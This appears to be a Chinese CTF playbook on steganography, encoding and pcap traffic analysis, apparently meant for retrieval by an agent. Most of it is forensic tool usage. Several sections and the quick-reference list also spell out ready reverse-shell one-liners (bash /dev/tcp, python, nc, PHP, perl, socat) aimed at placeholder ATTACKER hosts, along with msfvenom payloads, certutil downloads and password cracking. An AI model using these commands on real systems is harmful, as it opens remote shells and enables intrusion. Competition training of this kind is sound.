# 隐写与流量分析手册

适用题型（命中即召回本手册）：隐写 stego LSB zsteg binwalk foremost strings 音频 频谱 steghide 压缩包 zip 伪加密 明文攻击 编码 base64 pcap tshark scapy 流量分析 反弹 shell reverse-shell nc PTY

## 1. 识别与分类
- 附件图片/音频/压缩包/文本→隐写；file 类型与扩展名不符或体积异常偏大→追加数据/伪加密；图片 LSB 0/1 比例偏离 50%→LSB 隐写；音频频谱现文字→频谱隐写。
- 附件 .pcap/.pcapng→流量分析：`tshark -r x.pcap -q -z io,phs` 先看协议分布，再按 HTTP/DNS/FTP/SMTP/USB 定向提取。
- 需要交互拿 shell 或执行命令→反弹 shell；拿到的是哑 shell→PTY 升级。

## 2. 攻击方法论
1. 图片通用流水线：`strings f | grep -iE 'flag|key|pass'` → `exiftool f` → `binwalk -e f`（挖追加/内嵌 zip）→ `zsteg -a f`（LSB）→ `foremost -i f -o out`（按头尾签名雕刻）。
2. PNG 专项：`pngcheck -v f` 看 tEXt/zTXt/iTXt 隐藏块；宽高 CRC 爆破用 `zlib.crc32` 枚举 w,h 匹配原 CRC；APNG 动画用 apngdis 拆帧；尾部追加 zip 直接 `unzip f`。
3. JPEG：`steghide extract -sf f [-p PASS]`；无口令先试空/常见词，`stegseek f rockyou.txt` 快速爆破；`exiftool -b -ThumbnailImage` 抽缩略图；FF D9 尾后追加数据用 dd 截取。
4. 音频：sox 出频谱 `sox a.wav -n spectrogram -o s.png` 找文字；LSB 用 python wave 取最低位；DTMF `multimon-ng -t wav -a DTMF`；比对 data chunk 声明长度与文件实际长找 WAV 尾追加数据。
5. 压缩包：伪加密=zip 目录项加密标志位 0x09 改 0x00 即可解；已知包内完整明文文件用 bkcrack/pkcrack 恢复密钥解全包。
6. 编码识别：先 file/熵判断层数，`base64 -d`→再判；覆盖 URL-safe base64、base32/58/85/91、hex、rot13/47、摩斯(.-)、培根(大小写/正斜体)、零宽字符(0x200b/c/d/feff)逐层解套。
7. pcap 提物：HTTP 对象 `tshark -r f.pcap --export-objects http,dir/`；追踪流 `tshark -r f.pcap -q -z follow,tcp,ascii,N`；提取字段 `-T fields -e http.file_data`/`-e data.data`。
8. 凭据/隐蔽信道提取：FTP `-Y "ftp.request.command==USER||ftp.request.command==PASS"`；HTTP Basic `http.authbasic`；DNS 隧道 `dns.qry.name.len>50`、TXT `dns.qry.type==16`；ICMP 外带 `icmp && data.len>48`。
9. scapy 协议字段：`from scapy.all import *; pkts=rdpcap('f.pcap')`；遍历 `p[TCP].dport`、`p[Raw].load` 统计 top talker/端口/异常包。
10. USB HID 键盘还原：`tshark -r f.pcap -Y "usb.capdata" -T fields -e usb.capdata` 取 8 字节，按 keycode 表（0x04=a..0x1d=z、0x28=Enter、0x2c=Space）还原按键。
11. 反弹 shell（ATTACKER=攻击机 IP、LPORT=端口，均为占位）：bash `bash -i >& /dev/tcp/ATTACKER/LPORT 0>&1`；python `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`；nc `nc -e /bin/bash ATTACKER LPORT`；PHP `php -r '$s=fsockopen("ATTACKER",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'`。
12. 文件传输：攻击机 `python3 -m http.server 8000`，靶机 `wget/curl` 拉取；无 wget 用 `nc -lvnp 9999 > f` 收 + `nc IP 9999 < f` 发；二进制用 `base64 -w0 f` 粘贴重建。
13. 流量统计与异常：`tshark -r f.pcap -q -z conv,tcp` 看会话、`-z io,stat,1` 看 I/O 时序找 C2 心跳、`-z endpoints,ip` 看端点。
14. 重建传输文件：FTP 数据通道 follow stream 存 Raw 另存；HTTP 响应体 `http.file_data` 拼接成文件再 file/binwalk 判定。

## 3. 变体与绕过
- 图片 LSB 藏的是 zip/PNG/文本：zsteg 提纯后 `file` 再判定，常再套一层编码或压缩；polyglot（PDF+ZIP/JPEG+ZIP）直接 unzip 挖。
- 文本隐写：制表符/空格编码二进制（stegsnow）、零宽字符、同形字（西里尔 a 冒充拉丁 a）多路排查。
- 音频隐藏：频谱、波形摩斯、DTMF、WAV 尾追加数据多路排查，别只看频谱。
- TLS 加密流量需 SSLKEYLOGFILE 或服务器私钥才能解，否则只能看 SNI/证书指纹/握手元数据。
- 图片多帧/调色板：GIF 逐帧 `convert -coalesce` 拆帧，调色板顺序藏数据 `gifsicle --color-info` 查看。
- pcap 修复：`pcapfix broken.pcap -o fixed.pcap` 修复坏包，`editcap` 做 pcapng→pcap 转换；`frame contains "flag"` 全包搜。
- 反弹 shell 变体：perl `perl -e 'use Socket;$i="ATTACKER";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`；socat `socat TCP:ATTACKER:LPORT EXEC:/bin/bash,pty,stderr`。
- Windows 反弹：PowerShell TCP 客户端，或 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=LPORT -f exe`；受限环境用 certutil/bitsadmin 下载。
- 反弹 shell 升级 PTY：`python3 -c 'import pty;pty.spawn("/bin/bash")'` → Ctrl+Z → `stty raw -echo; fg` → `export TERM=xterm`；无 python 用 `script /dev/null -c bash`。

## 战法要点
- 隐写先 strings/exiftool/binwalk 三板斧，再上 zsteg/steghide，最后才手工 LSB/频谱。
- 附件异常大或 file 类型不符，先 binwalk -e 挖追加/内嵌文件。
- 编码题先判层数（file/熵/字符集），逐层解套而非直接猜算法。
- pcap 先协议层次统计再定向提取，HTTP 对象/流追踪优先于逐包看。
- 反弹 shell 优先 bash /dev/tcp，受限再试 python/nc/php/perl/socat 变体；哑 shell 必做 PTY 升级。
- 拿到文件先 strings 一把梭，flag/key/password 明文常直出。
- 流量题先看 HTTP/FTP 明文传文件，再查 DNS/ICMP 隐蔽信道，最后 USB 键鼠。
- 反弹 shell 前先确认出网方向与可用解释器，别把 bash 当唯一选择。

## 速查清单
```text
strings f | grep -iE 'flag|key|pass' ; exiftool f ; binwalk -e f
zsteg -a img.png ; steghide extract -sf img.jpg ; stegseek img.jpg rockyou.txt
foremost -i f -o out ; sox a.wav -n spectrogram -o s.png
tshark -r f.pcap -q -z io,phs ; tshark -r f.pcap --export-objects http,dir/
tshark -r f.pcap -q -z follow,tcp,ascii,0
scapy: rdpcap('f.pcap') ; p[TCP].dport ; p.haslayer(Raw).load
bash -i >& /dev/tcp/ATTACKER/LPORT 0>&1
python3 -c 'import pty;pty.spawn("/bin/bash")'   # PTY 升级
tshark -r f.pcap -q -z conv,tcp      # 会话统计
pcapfix broken.pcap -o fixed.pcap     # pcap 修复
socat TCP:ATTACKER:LPORT EXEC:/bin/bash,pty,stderr
```
